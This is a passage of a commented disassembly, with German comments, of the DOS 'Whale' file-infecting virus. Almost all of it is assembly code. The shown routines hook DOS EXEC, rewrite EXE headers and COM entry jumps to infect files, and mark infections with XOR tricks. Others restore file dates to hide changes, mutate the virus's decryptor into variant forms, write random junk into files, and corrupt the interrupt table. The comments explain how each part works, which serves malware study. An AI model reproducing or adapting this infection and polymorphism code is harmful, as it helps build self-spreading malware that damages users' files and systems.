                PUSH    WORD PTR CS:[D24E6]     ; Caller-IP
                POP     Word Ptr DS:[000Ah]
                POP     Word Ptr DS:[000Ch]
                PUSH    DS
                MOV     AL,22h
                LDS     DX,Dword Ptr DS:[000Ah]
                CALL    SetInt_AL               ; SET INT 22 TO CALLER
                POP     DS
                POPF                            ; POP Original-Flags
                POP     AX                      ; POP RET-Adresse
                MOV     SP,CS:[D24FF]           ; SP-INIT
                MOV     SS,CS:[D2501]           ; SS-INIT
                MCODE   42
                JMP     DWORD PTR CS:[D2503]    ; EXEC Programm
;=====================================================================
;==============( Datei ist infiziert. Wal desinfiziert sie im RAM )===
;=====================================================================
;       Offset 100H     JMP     4BCC = E9 C9 4A
;       Offset 2814     EXE_ID         E9 pq rs , Savebytes
;       Offset 4BCC     Vir-Entry
;       2814-4AC9-100h = DC4B usw.
;=====================================================================
J034AF:         MDECODE 43                      ; SI zeigt auf COM-START
                MOV     BX,[SI+01h]             ; Sprungziel nach BX
                MOV     AX,[BX+SI+0DC4Bh]       ; -23B5, Diff -3  zw.
                MOV     [SI],AX                 ;  Savebytes und 4BCC
                MOV     AX,[BX+SI+0DC4Dh]       ; -23B3
                MOV     [SI+02h],AX
                MOV     AX,[BX+SI+0DC4Fh]       ; -2361
                MOV     [SI+04h],AX
                CALL    J045D0                  ; 'aktiv-msg'
                MCODE   43
                JMP     J0345F                  ;
;=====================================================================
;================================(   EINTRITT IN "ARBEITSPHASE"   )===
;================================( Durch die erste Anweisung wird )===
;================================( der JMP zum Relokator erzeugt  )===
;=====================================================================
J034D4:         MOV     BYTE PTR CS:[SI+SwapCode_2],0E9h
                                        ; JMP bei 3A20 erzeugen !!
                POP     BP              ; BP = 20h
                MOV     CX,0004h        ; Das nÑchste RET macht wieder
                                        ; "PUSH BX,RET"
                MOV     BX,DS           ; BX = DS
                OR      BX,BP           ; BX = DS or 20h
                MOV     DS,BX           ; DS = DS or 20H

J034E4:         SHL     BX,1            ; BX = BX * 16
                LOOP    J034E4

                MOV     AX,CX           ; AX = 0
                MOV     CX,001Ch        ; CX = 1C

J034ED:         ADD     AH,[BX]
                INC     BX
                LOOP    J034ED

                PUSH    AX              ; AX auf den Stack
 
                MOV     CX,[BX]
                PUSH    CS
                POP     AX
                SHR     BH,1
                JMP     J03919
;=====================================================================
;================================================( Gehîrt zu EXEC )===
;=====================================================================
J034FC:         CMP     AL,01h  ; AX = 4B01 ( durch Debugger und Wal )
                JZ      J03510  ; ja  , durch Debugger und Wal.
                JMP     J02B8B  ; nein, AX=4B03. Low-int-21h rufen
;=====================================================================
;===========================================================(trash)===
;=====================================================================
J03503: DB      01,0cbh,81h,0fbh,34h,28h,72h,0f8h,81h,0f1h,21h,21h,0a1h
        ;---------------------------------------
        ;J03503:ADD     BX,CX
        ;       CMP     BX,2834h        ; OFFSET VIR_NAME
        ;       JB      J03503
        ;       XOR     CX,2121h        ; "!!"
        ;       MOV     AX,WORD PTR DS:[30E8h]
        ;       STD
        ;       SUB     [BX+SI],AL
        ;---------------------------------------
;=====================================================================
;==============================================( EXEC mit 4B01h   )===
;==============================================( Aufruf durch WAL )===
;==============================================( und Debugger     )===
;=====================================================================
J03510:         MDECODE 44
                OR      WORD PTR CS:[D24B3  ],+01h      ; CALLERS Flags
                MOV     Word ptr CS:[D2424+2],ES        ; EPB sichern
                MOV     Word ptr CS:[D2424  ],BX
                CALL    PopALL
                CALL    CS:[@INT21]           ; int 21h rufen
                CALL    PushALL
                LES     BX,DWord ptr CS:[D2424]         ; EPB zurÅck
                LDS     SI,DWord ptr ES:[BX+12h]        ; CS:IP holen
                MCODE   44
                JNB     J03542          ; ---> Infektion
                JMP     J035E0          ; ---> fertig
;=========================================================()========
J03542:         AND     BYTE PTR CS:[D24B3],0FEh; CF lîschen
                CMP     SI,+01h                 ; ist IP-INIT=1 (infiziert)
                JZ      J0358E
                MDECODE 45
                MOV     AX,[SI]
                ADD     AX,[SI+02h]
                PUSH    BX
                MOV     BX,[SI+04h]
                XOR     BX,5348h                ; "SH"
                XOR     BX,4649h                ; "FI"
                ADD     AX,BX
                POP     BX
                MCODE   45
                JNZ     J035C3          ; nicht markierbar, keine Infektion
                ;---------------------( Dateianfang manipulieren )---
                MDECODE 46
                MOV     BX,[SI+01h]
                MOV     AX,[BX+SI+0DC4Bh]       ; SIEHE 34af!
                MOV     [SI],AX
                MOV     AX,[BX+SI+0DC4Dh]
                MOV     [SI+02h],AX
                MOV     AX,[BX+SI+0DC4Fh]
                MOV     [SI+04h],AX
                MCODE   46
                JMP     SHORT J035C3    ; Terminate-Adresse festlegen

;=====================================================================
;=====================================( Datei ist schon infiziert )===
;=====================================================================
J0358E:         MDECODE 47                      ; ES:BX = EPB
                MOV     DX,WORD PTR DS:[001Ah]  ; DS:SI = CS:IP der Datei
                CALL    GET_Current_PSP

                MOV     CX,CS:[@PSP]
                ADD     CX,+10h
                ADD     DX,CX
                MOV     ES:[BX+14h],DX

                MOV     AX,Word Ptr DS:[0018h]
                MOV     ES:[BX+12h],AX

                MOV     AX,Word Ptr DS:[0012h]
                ADD     AX,CX
                MOV     ES:[BX+10h],AX

                MOV     AX,Word Ptr DS:[0014h]
                MOV     ES:[BX+0Eh],AX
                MCODE   47
;=====================================================================
;==============================( Installation des INT 22-Handlers )===
;=====================================================================
J035C3:         MDECODE 48
                CALL    GET_Current_PSP
                MOV     DS,CS:[@PSP]
                MOV     AX,[BP+02h]
                MOV     Word Ptr DS:[000Ah],AX  ; OFFSET int 22-Handler
                MOV     AX,[BP+04h]
                MOV     Word Ptr DS:[000Ch],AX  ; Segment int 22-Handler
                MCODE   48
J035E0:         JMP     J02EA3                  ; Fertig
;=====================================================================
;====================================( kann ja fast nicht sein ...)===
;=====================================================================
; erzeugt wird :
;       DB      01h
;       DW      CS
;       DW      SS
;       DW      SP
;--------------------------------------------------------------------
J035E3: MOV     WORD PTR CS:[023Ah],CS          ;2a4a
        MOV     WORD PTR CS:[023Ch],SS          ;2a4c
        MOV     WORD PTR CS:[023Eh],SP          ;2a4e
        MOV     BYTE PTR CS:[0239h],01h         ;2a49
        PUSH    DS
        POP     AX                              ; ist auch bloss MÅll !
;=====================================================================
;=================================( Kontrolle des Verfalls-Datums )===
;=====================================================================
Check_Verfallsdatum:
                MDECODE 49
                CALL    PushALL
                MOV     AH,2Ah          ; GET System Time & Date
                CALL    CS:[@INT21]     ;
                CMP     CX,07C8h        ; 1992
                JNB     J0361A          ; CX >= 1992 : Setze [Error],1
                CMP     CX,07C7h        ; 1991
                JNZ     J03620          ; CX <> 1991 : Lasse [Error]
                CMP     DH,04h          ; April
                JB      J03620          ; DH < APRIL : Lasse [Error]
                ;-----------------------------------------------------
J0361A:         MOV     BYTE PTR CS:[Error],01h
J03620:         CMP     BYTE PTR CS:[Error],00h
                JZ      J0362F
                CALL    PopALL
                POP     AX
                JMP     J03632
                ;--------------
J0362F:         CALL    PopALL
J03632:         MCODE   49
                CMP     BYTE PTR CS:[Error],00h
                JZ      J03641
                JMP     J03761  ; Returnadresse bleibt auf Stack...
J03641:         RETN
;=====================================================================
;==================================( "JMP Decode_Whale" schreiben )===
;=====================================================================
J03642:         MDECODE 50
                ;-------------------------------------------------------
                MOV     BYTE PTR CS:[0001h],0E9h     ; JMP 23BC /4BCC
                MOV     BYTE PTR CS:[0002h],0B8h     ; CS:0001=CS:2811
                MOV     BYTE PTR CS:[0003h],023h
                ;--------------------------------------------------
                CALL    Trace_int_13h

                CALL    J0378C  ; errechnet unter anderem Paras fÅr File
                                ; SI = benîtigte Paragrafen
                                ; CX = 10h
                                ; DX:AX = Filesize gerundet
                                ; auf nÑchsten Paragrafen

                MOV     BYTE Ptr DS:[OFFSET EXE_FLAG-Offset VirStart],01h
                CMP     WORD Ptr DS:[CodBuf],'MZ'
                MCODE   50
                JZ      J0367E
                DEC     BYTE Ptr DS:[Offset Exe_Flag-Offset VirStart]

                JZ      J036F9          ; Wenn EXE-FLAG "1" war,
                                        ; also immer (!)
;=====================================================================
;=========================================(  EXE-Header auswerten )===
;=========================================( Infektion vorbereiten )===
;=====================( die Berechnung scheint fehlerhaft zu sein )===
;=====================================================================
J0367E:         MDECODE 51
                MOV     AX,WORD PTR DS:[CodBuf+4]   ; Pages
                SHL     CX,1            ; CX = 20h
                MUL     CX              ; AX ist ((LÑnge-1) div 200h)*20h
                                        ; Also jetzt : (LÑnge-1) DIV 10H
                                        ; AX enthÑlt die benîtigte Anzahl
                                        ; Paragrafen, um EXE zu laden.
                ADD     AX,0200h        ; AX=AX+200h, gibt keinen Sinn
                CMP     AX,SI           ; Vergleiche AX mit Max-Paras
                MCODE   51
                JB      J036F6          ; jmp, wenn AX kleiner ist

                MOV     AX,WORD PTR DS:[CodBuf+0Ah] ; MinFree
                OR      AX,WORD PTR DS:[CodBuf+0Ch] ; MaxFree
                JZ      J036F6
                MDECODE 52
                MOV     DX,Word ptr DS:[FileSize+2]
                MOV     CX,0200h
                MOV     AX,Word ptr DS:[FileSize  ]
                DIV     CX              ; AX = (DX:AX) / 512; -> Pages
                OR      DX,DX           ; Blieb ein Rest ???
                MCODE   52
                JZ      J036B8          ; ja..
                INC     AX
J036B8:         MOV     WORD PTR DS:[CodBuf+2  ],DX     ; LÑnge LastPage
                MOV     WORD PTR DS:[CodBuf+4  ],AX     ; Anzahl Pages
                CMP     WORD PTR DS:[CodBuf+14h],+01h   ; IP-Init = 1?
                JNZ     J036CA                          ; ( Whale !)
                JMP     J03761                          ; dann fertig !
;--------------------------------------------------------------------
                DB      0E8h
;--------------------------------------------------------------------
J036CA:         CALL    Check_Verfallsdatum
                MDECODE 53
                MOV     WORD PTR DS:[CodBuf+14h],0001h
                                                        ; IP-INIT = 0001h
                MOV     AX,SI                           ; MaxParas -> AX
                SUB     AX,WORD PTR DS:[CodBuf+8]       ; AX=AX-Headerparas
                MOV     WORD PTR DS:[CodBuf+16h ],AX    ; CS-INIT <-AX !!!!
                ADD     WORD PTR DS:[CodBuf+4   ],+12h  ; 12 Pages dazu
                                                        ; (== Whale-Size )
                ;-----------------------------------------------------------
                ; eine andere Art, ein Virus zu entdecken :
                ; Wenn ein EXE wie ein COM initialisiert wird...
                ;-----------------------------------------------------------
                MOV     WORD PTR DS:[CodBuf+010h],0FFFEh; SP-Init = COM-LIKE
                MOV     WORD PTR DS:[CodBuf+ 0Eh],AX    ; SS-Init = CS-Init
                MCODE   53
                CALL    Infect_File
J036F6:         JMP     J03761
;=====================================================================
;=======================================( Verfahren fÅr COM-Files )===
;=====================================================================
J036F9:         CMP     SI,0F00h        ; COM-Size > 61440 Byte ?!?
                JNB     J03761          ; Dann geht es eben nicht ...

                ;--------------( merken der ersten 6 Byte des COM )---
                MDECODE 54
                MOV     AX,WORD PTR DS:[CodBuf  ] ; whale:
                MOV     WORD PTR DS:[0004h],AX    ; AX = 20CC
                ADD     DX,AX                     ; DX = 0, da COM
                MOV     AX,WORD PTR DS:[CodBuf+2]
                MOV     WORD PTR DS:[0006h],AX    ; AX = 0
                ADD     DX,AX                     ; DX = 20CC
                MOV     AX,WORD PTR DS:[CodBuf+4] ; AX = 0
                MOV     WORD PTR DS:[0008h],AX

                XOR     AX,5348h  ; 'SH' !!       ; AX = 5348
                XOR     AX,4649h  ; 'FI' !!       ; AX = 1501

                ADD     DX,AX                     ; DX = 35CD
                MCODE   54
                JZ      J03761     ; DX = 0 -> Keine Infektion ,
                                   ; File kann nicht markiert werden.

                MOV     AX,WORD PTR DS:[D24F2]  ; Hole Fileattribut
                AND     AL,04h                  ; Ist es SYSTEM ?
                JNZ     J03761                  ; jmp, wenn ja
                CALL    Check_Verfallsdatum

                MDECODE 55
                ;---------------------( JMP am COM-Start erzeugen )---
                MOV     CL,0E9h
                MOV     AX,0010h
                MOV     BYTE PTR DS:[CodBuf],CL
                MUL     SI                       ; AX = COM-LÑnge in Byte,
                                                 ; auf ganzen Paragrafen
                                                 ; gerundet
                ADD     AX,23B9h                 ; So weit also + 3 Byte
                                                 ; zum De-Cryptor
                MOV     WORD PTR DS:[CodBuf+1],AX; hier also "JMP J04BCC"
                ;----------------------------------------------------
                ;-----------------( File als infiziert markieren )---
                ;----------------------------------------------------
                MOV     AX,WORD PTR DS:[CodBuf  ]; AX = C9E9
                ADD     AX,WORD PTR DS:[CodBuf+2]; AX = C9E9+004A =CA33
                NEG     AX                       ; AX = - AX = 35CD

                XOR     AX,4649h  ; 'FI' !!      ; AX = 7384
                XOR     AX,5348h  ; 'SH' !!      ; AX = 20CC (!!)

                MOV     WORD PTR DS:[CodBuf+4],AX; Siehe Label "start"
                MCODE   55
                CALL    Infect_File
;--------------------------------------( Ende der Infektionsphase )---
J03761:         MDECODE 56

                MOV     AH,3Eh                  ; CLOSE FILE
                CALL    CS:[@INT21]

                MOV     CX,CS:[D24F2]
                MOV     AX,4301h                ; Change File-Attribut
                MOV     DX,CS:[D24F4]           ; Offset Filename
                MOV     DS,CS:[D24F6]           ; Segment Filename

                CALL    CS:[@INT21]
                CALL    J048CD          ; RESET Int 13h und Int 24h
                MCODE   56              ; Alles ist so wie vorher...
                RETN
;=====================================================================
;====================================( Vorbereitung fÅr Infektion )===
;=====================================================================
J0378C:         MDECODE 57
                PUSH    CS
                MOV     AX,5700h                ; Get File-date
                POP     DS
                CALL    CS:[@INT21]

                MOV     WORD PTR DS:[FileTime],CX  ; Uhrzeit

                MOV     AX,4200h                ; SEEK Fileanfang
                MOV     Word Ptr DS:[FileDate],DX
                XOR     CX,CX
                XOR     DX,DX
                CALL    CS:[@INT21]

                MOV     AH,3Fh                  ; Read file
                MOV     DX,OFFSET CodBuf        ; nach DS:DX
                MOV     CL,1Ch                  ; 1C byte ( EXE-Header ! )
                CALL    CS:[@INT21]

                XOR     CX,CX                   ; Weils so schoen war ...
                MOV     AX,4200h
                XOR     DX,DX
                CALL    CS:[@INT21]

                MOV     CL,1Ch                  ; diesmal nach DS:0004 lesen
                MOV     AH,3Fh                  ; == CS:2814
                MOV     DX,0004h
                CALL    CS:[@INT21]

                XOR     CX,CX                   ; seek file-Ende
                MOV     AX,4202h
                MOV     DX,CX
                CALL    CS:[@INT21]

                MOV     Word Ptr DS:[FileSize+2],DX     ; FileSize merken
                MOV     Word Ptr DS:[FileSize  ],AX

                MOV     DI,AX           ; BEISPIEL : AX=9273 -> DI=9273
                ADD     AX,000Fh        ; AX=9282
                ADC     DX,+00h         ; öbertrag nach DX
                AND     AX,0FFF0h       ; AX=9280
                SUB     DI,AX           ; DI=FFF3
                MOV     CX,0010h        ; CX=10
                DIV     CX              ; AX=928 = Anzahl Paras fÅr File
                MOV     SI,AX           ; SI=928
                MCODE   57
                RETN
;=====================================================================
;=====================================================( Infektion )===
;=====================================================================
Infect_File:    MDECODE 58
;*****************************************
JMP CODE_58     ;************************* e-i-n-g-e-f-Å-g-t-
;*****************************************

                XOR     CX,CX
                MOV     AX,4200h                ; SEEK File-Anfang
                MOV     DX,CX                   ; CX=DX=0
                CALL    CS:[@INT21]             ; INT 21h

                MOV     CL,1Ch                  ; 1C Byte
                MOV     AH,40h                  ; Write to File

                MOV     DX,Offset CodBuf        ; EXE-Header / COM-Start
                CALL    CS:[@INT21]             ; INT 21h

                MOV     AX,0010h
                MUL     SI                      ; AX = AX * maxparas
                MOV     CX,DX                   ; DX = Offset CodBuf
                MOV     DX,AX                   ;
                MOV     AX,4200h                ; SEEK from start to CX:DX
                CALL    CS:[@INT21]             ; INT 21h

                MOV     CX,Offset CodBuf        ; CX = CodBuf
                XOR     DX,DX                   ; DX = 0
                ADD     CX,DI                   ; CX = Offset CodBuf+DI

                MOV     AH,40h                  ; WRITE-FILE

                CALL    Mutate_Whale            ; Mutieren

                CALL    @10_Prozent             ; jedes 10. Mal Wal
                                                ; zerstîren
                CALL    Suche_Fish              ; Jedes 4. Mal FISH.TBL
                                                ; schreiben

                MOV     BYTE Ptr DS:[InfectFlag],01h ; "habe infiziert"
                MOV     BYTE Ptr DS:[D2433],01h ; VerschlÅsseln, schreiben,
                                                ; entschlÅsseln !

                PUSH    BX
                PUSH    ES

                PUSH    CS
                POP     ES

                MOV     Word Ptr DS:[D2579],SI

                MOV     SI,OFFSET J0491A - Offset VirStart
                ;-----------------------------------------------------
                ;----------------------------( Wal-Code zerstîren )---
                ;-----------------------------------------------------
                MOV     BYTE Ptr DS:[SwapCode_5],0CCh   ; 3259  , 0e8h
                MOV     BYTE Ptr DS:[SwapCode_2],0C6h   ; 3A20  , 0e9h
                MOV     BYTE Ptr DS:[SWAPCODE_6],0CCh   ; 2cff  , 0c3h
                ;-----------------------------------------------------
                CALL    Kill_Int_Table  ; nur eine einzige Infektion
Code_58:        MCODE   58              ; pro Session !
;=====================================================================
;============================================( Zerstîren des Wals )===
;=====================================================================
                CALL    PATCH                   ; gepatchten code
                                                ; zerstîren
                MOV     SI,SWAPCODE_4
                XOR     WORD Ptr DS:[SI],0EF15h ; PATCH zerstîren
                ADD     SI,+02h
                XOR     WORD Ptr DS:[SI],4568h  ; ---""-----------
                MOV     BYTE Ptr DS:[SwapCode_1],03Dh
                                                ; DECODE zerstîren
                ;=====( eigentliche infektion )=======================
                                           ;=========================;
                CALL    Code_Whale         ; Whale kodieren          ;
                                           ; aber NICHT LauffÑhig !! ;
                                           ;=========================;

                ;-------------------------( und rÅckgÑngig machen )---
                MOV     Byte Ptr DS:[SwapCode_1],0E9h
                XOR     WORD Ptr DS:[SI],4568h
                SUB     SI,+02h
                XOR     WORD Ptr DS:[SI],0EF15h
                ADD     SI,SwapCode_3                     ; SI = 210Ah
                CALL    PATCH
                ;=====================================================
                MDECODE 59
                MOV     SI,[D2579]
                POP     ES
                POP     BX
                CALL    Write_Trash_To_File

                MOV     CX,WORD PTR DS:[FileTime]

                MOV     AX,5701h                ; SET FILEDATUM !
                MOV     DX,WORD PTR DS:[FileDate]
                TEST    CH,80h                  ; Stunde > 16 ?
                JNZ     J038C3                  ; jmp, wenn nicht
                OR      BYTE PTR CS:[TrashFlag],00h
                JNZ     J038C3                  ; TrashFlag = "1" :jmp
                ADD     CH,80h                  ; Stunde=Stunde-16
J038C3:         CALL    CS:[@INT21]   ; Set Filedatum
CODE_59:
                MCODE   59
                RETN
;=====================================================================
;===========================( Den Whale-Code zerstîren , bei der  )===
;===========================( Infektion jedes 10. COM-Files       )===
;===========================( Zweck :  Geburtenkontrolle !        )===
;=====================================================================
@10_Prozent:    MDECODE 60
                CALL    PushALL
                MOV     BYTE PTR CS:[TrashFlag],00h
                OR      BYTE Ptr CS:[Offset Exe_Flag-Offset VirStart],0
                JNZ     J0390E          ; Jmp, wenn EXE-File

                IN      AL,40h
                CMP     AL,19h          ; 90 % liegen Åber 19h
                JNB     J0390E          ; fertig, nichts weiter tun
;-------------------------------------( Wal zerstîrt seinen Code )---
                INC     BYTE PTR CS:[TrashFlag]; ist jetzt "1"
                MOV     BX,000Ah
                MOV     CX,0016h

J038F4:         IN      AL,40h
                MOV     CS:[BX],AL      ; 16h Byte von CS:281A..2830
                INC     BX              ; durch Zufallszahlen Åberschreiben
                LOOP    J038F4
                IN      AL,40h
                MOV     BYTE PTR CS:[0001h],AL  ; dito den JMP bei CS:2811
                IN      AL,40h
                MOV     BYTE PTR CS:[0002h],AL
                IN      AL,40h
                MOV     BYTE PTR CS:[0003h],AL

J0390E:         CALL    PopALL
                MCODE   60
                RETN
;----------------------------------------------------
J03916:         DB      0E9H,09Dh,0F2H   ;JMP     J02BB6 => Nirwana
;--------------------------------------------------------------------
;------------------------------------------------------( Hmmmmm ) ---
;--------------------------------------------------------------------
J03919:         ;       JZ      J03916  ; => Nirwana !
                MOV     DX,DS           ; DX <- DS
                POP     AX              ; AX = 20h
                ADD     DX,+10h         ; DX = DS:100
                MOV     DS,DX           ; DS = DX
                MOV     BX,[BX]         ; BX:=0030:011C, DAS IST DER
                NEG     BX              ; TASTATURPUFFER ( 40:1C) !
                ADD     BX,CX           ; es testet den Tastaturpuffer
;********************************************************************
                CMP     BX,BX           ;**** EINGEFöGT *************
;********************************************************************
                JNZ     J03936          ; dann direkt in die Dekode-Routine
                                        ; mit SI als Returnadresse
                JZ      J03990          ; sonst "decode" scharfmachen
        ;-------------------------------------------------( trash )---
        DW      00A72h
        DW      00B73H
        DW      0FEE9H
        DW      0E9F2h
        DW      43H
        ;-------------------------------------------------------------
J03936: JMP     J02B87                  ; = push si, jmp decode

;---------------------------------------------------------------------
        DB      0e9h,06dh,0ah,0e9h,0a4h,0fch
;=====================================================================
;========================================( Schreibt MÅll in Datei )===
;=====================================================================
Write_Trash_To_File:
                MDECODE 61
                CALL    PushALL
                OR      BYTE PTR CS:[TrashFlag],00h
                JZ      J0396A          ; falls "0" nichts tun

                XOR     AX,AX
                IN      AL,40h
                MOV     DS,AX

                MOV     DX,0400h        ; DX = 400h

                IN      AL,40h
                XCHG    AH,AL
                IN      AL,40h
                MOV     CX,AX
                AND     CH,0Fh          ; CX = 0xxxh
                MOV     AH,40h          ; WRITE File

                CALL    CS:[@INT21]

J0396A:         CALL    PopALL
                MCODE   61
                RETN
;---------------------------------------------------------( trash )---
                DB      0b9h,01ch,000h,089H
                DB      0d7h,0B3h,000h,0e8H
;========================================================()===========
J0397A:         MDECODE 62
                CALL    SaveRegisters
                MOV     DI,DX
                ADD     DI,+0Dh
                PUSH    DS
                POP     ES
                MCODE   62
                JMP     J039EC          ; ist die Datei ausfÅhrbar ?
;=====================================================================
;===========================================( Decode scharfmachen )===
;=====================================================================
J03990:         MOV     BYTE PTR CS:[SI+SwapCode_1],0E9h; JMP erzeugen
                JMP     J03A1C
                DB      0EAh
;=====================================================================
;======================================( zerstîrt die INT-Tabelle )===
;=====================================================================
Kill_Int_Table:
                MDECODE 63
                CALL    PushALL
                MOV     BX,23F1h        ; 4C01
                MOV     CX,000Eh        ; CX = 0Eh
                PUSH    AX
                MOV     AX,0000h
                MOV     ES,AX           ; ES = 0000
                POP     AX

J039AF:         IN      AX,40h          ; Hole zufallszahl
                MOV     SI,AX
                PUSH    ES:[SI]         ; zerstoere INT-Tabelle
                POP     [BX]            ; durch 14 Zufalls-Werte !
                INC     BX              ; Die in [bx] gemerkt werden
                LOOP    J039AF
                CALL    PopALL
                MCODE   63
                RETN
;=====================================================================
;===================================( check auf ausfÅhrbare Datei )===
;=====================================================================
J039C3:         MDECODE 64
                CALL    SaveRegisters
                PUSH    DS
                POP     ES
                MOV     CX,0050h
                MOV     DI,DX
                MOV     BL,00h
                XOR     AX,AX
                CMP     BYTE Ptr DS:[DI+01h],':' ; Laufwerk im Filenamen ?
                JNZ     J039E1
                MOV     BL,[DI]              ; Ja, dann Buchstabe nach BL
                AND     BL,1Fh               ; HEX-ZAHL drausmachen
J039E1:         MOV     CS:[D2428],BL        ; und in die DRIVE-Variable
                REPNZ   SCASB                ; ENDE des Filenamens suchen
                MCODE   64
;---------------------------------------------------------------------
;---------------------------------( Erkennung der Datei-Extension )---
;---------------------------------------------------------------------
J039EC:         MDECODE 65
                MOV     AX,[DI-03h]          ; ENDE - 3, ist EXTENSION
                AND     AX,0DFDFh            ; Gross-Schrift
                ADD     AH,AL
                MOV     AL,[DI-04h]
                AND     AL,0DFh              ; Gross-schrift
                ADD     AL,AH
                MOV     BYTE PTR CS:[EXE_FLAG],00h
;---------------------------------------------------------------------
;------------( Angenommen, es war ein COM, dann gilt :  )-------------
;------------( AND AX,0DFDF : AX = 4D4F  / 'MO'         )-------------
;------------( ADD AH,AL    : AX = 9C4F                 )-------------
;------------( MOV AL,[Di-4]: AX = 9C43  / 'xC'         )-------------
;------------( ADD AL,AH    ; AX = 9CDF                 )-------------
;---------------------------------------------------------------------
;------------( BEI EXE kommt AL=E2 heraus, bei COM AL=DF)-------------
;---------------------------------------------------------------------
                CMP     AL,0DFh              ; Also : IST ES EIN COM ?
                MCODE   65
J03A0C:         JZ      J03A17
                INC     BYTE PTR CS:[EXE_FLAG]
                CMP     AL,0E2h              ; Also : IST ES EIN EXE ?
                JNZ     J03A23               ; Weder COM noch EXE
J03A17:         CALL    GetRegsFromVirstack  ; COM oder EXE
                CLC                          ; Carry-Flag lîschen
                RETN
;=====================================================================
;====================================( JMP wird zeitweise erzeugt )===
;====================================( Einziger JMP zum Relokator )===
;=====================================================================
J03A1C:         XOR     AX,AX
                PUSH    ES
                POP     DS
J03A20:         JMP     Relokator
;=====================================================================
J03A23:         CALL    GetRegsFromVirstack   ; Weder COM noch EXE
J03A26:         STC                           ; Carry-Flag setzen
                RETN
                DB      2Dh
;=====================================================================
;===============================================( Get current PSP )===
;=====================================================================
GET_Current_PSP:MDECODE 66
                PUSH    BX
                MOV     AH,51h
                CALL    CS:[@INT21]
                MOV     CS:[@PSP],BX
                POP     BX
                MCODE   66
                RETN
;=====================================================================
;==========================(--------------------------------------)===
;==========================(     HIER ENTSTEHEN DIE MUTANTEN !    )===
;==========================(--------------------------------------)===
;=====================================================================
Mutate_Whale:   MDECODE 67
                CALL    PushALL                 ; AH = 40h !
                OR      BYTE PTR CS:[InfectFlag],00h ; Hab schon infiziert !
                JNZ     J03A7C

                IN      AL,40h                  ; Zufallszahl holen
                CMP     AL,80h                  ; nur jedes 2 Mal arbeiten

J03A55:         JB      J03A7C
                CALL    Decode_3A84             ; Bereich 3A84h...436Ch

J03A5A:         IN      AL,40h                  ; Zufallszahl holen
                CMP     AL,1Eh                  ; kleiner als 1eh / 30d
                JNB     J03A5A

                XOR     AH,AH
                MOV     BX,M_SIZE
                MUL     BX                      ; Zufallszahl * 4Ch / 76d
                                                ; AX : 0000....08E8
                ADD     AX,Offset J03A84-Offset VirStart
                                                ; AX : 1274....1B5C

                PUSH    CS
                PUSH    CS
                POP     DS
                POP     ES                      ; ES=DS=CS

                                                ;======================
                MOV     SI,AX                   ; Quelle : 1274....1B5C
                                                ; bzw.     3A84....436C
                                                ; in StÅcken zu 4Ch !!!
                                                ;======================
                MOV     DI,Offset D4BB5-Offset VirStart
                MOV     CX,M_SIZE               ; 4C Byte von CS:SI
                                                ; nach CS:23A5/4BB5
                                                ; schaufeln
                CLD
                REPZ    MOVSB
                CALL    Code_3A84               ; Bereich 3A84h...436Ch

J03A7C:         CALL    PopALL
                MCODE   67
                RETN

;=================================( dieser Code steht immer davor )===
;Code_Whale:    PUSH    CX
;               PUSH    BX
;               MOV     BX,FirstByte
;               MOV     CX,Code_len     ; 2385h ; Wal-Size bis J04BB5
;=====================================================================
;       Die Nummerierung der Mutanten folgt dem TBSCAN.DAT-File
;=====================================================================
;=====================================================( MUTANT # 3)===
;=====================================================================
MUT_3           EQU     $
J03A84:         STD                             ; = OFFSET 4BB5
                MOV     CX,DreiByte             ; 0BD8h
J03A88:         XOR     WORD Ptr DS:[BX],1326h
                ADD     BX,+03h
                LOOP    J03A88

                MOV     CX,BX
                POP     CX
                MOV     BX,CX
                POP     CX
                MOV     AH,60h
                JMP     SHORT J03AB8
                ;--------( einsprung ) ---------( -1131 )------------
J03A9B:         PUSH    SI                      ; = 4BCC, SI = 100h
                CALL    J03AA1                  ;

                DW      6945h                   ; 4BD0

J03AA1:         POP     DX                      ; DX = 4BD0
                PUSH    CS
                SUB     DX,23A0H                ; DX = 2830

                POP     DS
                MOV     CX,DreiByte             ; CX = 0BD8
                XCHG    DX,SI                   ; DX = 100h, SI = 2830
J03AAD:         XOR     WORD Ptr DS:[SI],1326h
                ADD     SI,+03h
                LOOP    J03AAD
                JMP     SHORT J03AC0            ; SI = 4BB8
                ;----------------------------------------------------
J03AB8:         SUB     AH,20h         ; => AH = 40, WRITE FILE
                ;----------------( db-code )-------------------------
                Call_int21 3,MUT_3
                ;----------------
                JMP     J03A9B
                ;----------------------------------------------------
J03AC0:         SUB     SI,Offset D4BB5-4C40H ; SI = SI + 8Bh = 4C43h/D2433
                CMP     BYTE Ptr DS:[SI],01h
                JNZ     J03ACB
                POP     SI             ; originales SI vom Stack
                RETN

J03ACB:         PUSH    ES
                POP     DS
                ;----------------
J03ACD:         JMP_entry 3,mut_3
                ;----------------
;=====================================================================
;=====================================================( MUTANT #5 )===
;=====================================================================
MUT_5           EQU     $
J03AD0:         MOV     CX,0BD7h                ; CX = 0bd7 ; = OFFSET 4BB5
J03AD3:         XOR     WORD Ptr DS:[BX],4096h  ; also 11c3 mal, da BX um 3
                                                ; erhîht wird
                ADD     BX,+03h
                LOOP    J03AD3
                MOV     AX,ES
                POP     AX
                MOV     BX,AX
                POP     CX
                MOV     AH,50h
                JMP     SHORT J03B04

J03AE6:         PUSH    SI
        ;--------( einsprung ) ------
J03AE7:         STD
                CALL    J03AED
                PUSH    CS
                DEC     DI
J03AED:         POP     DX                      ; DX =
                PUSH    CS
                SUB     DX,23A0h                ; DX =
                POP     DS
                MOV     CX,0BD7h                ; CX =
                XCHG    DX,SI                   ; SI =

J03AF9:         XOR     WORD Ptr DS:[SI],4096h
                ADD     SI,+03h
                LOOP    J03AF9
                JMP     SHORT J03B0C            ; SI =


J03B04:         SUB     AH,10h                  ; AH = 40h !
                CALL_INT21 5,MUT_5
                JMP     J03AE6

J03B0C:         SUB     SI,0FF72h                ; SI =
                CMP     BYTE Ptr DS:[SI],01h
                JNZ     J03B17
                POP     SI
                RETN

J03B17:         PUSH    ES
                POP     DS
J03B18:         JMP_ENTRY 5,mut_5
;=====================================================================
;===================================================( MUTANT # 20 )===
;=====================================================================
MUT_20          EQU     $
                CMC                             ; = OFFSET 4BB5
                CALL    J03B61                  ; CX = 11C3
J03B20:         XOR     WORD Ptr DS:[BX],0406h
                INC     BX
                ADD     BX,+01h
                CMC
                LOOP    J03B20
                POP     BX
                CMC
                POP     CX
                CALL_INT21 20,MUT_20
                PUSH    AX
                POP     AX
        ;--------( einsprung ) ------
                CALL    J03B5E                  ; DS <- 4BCF

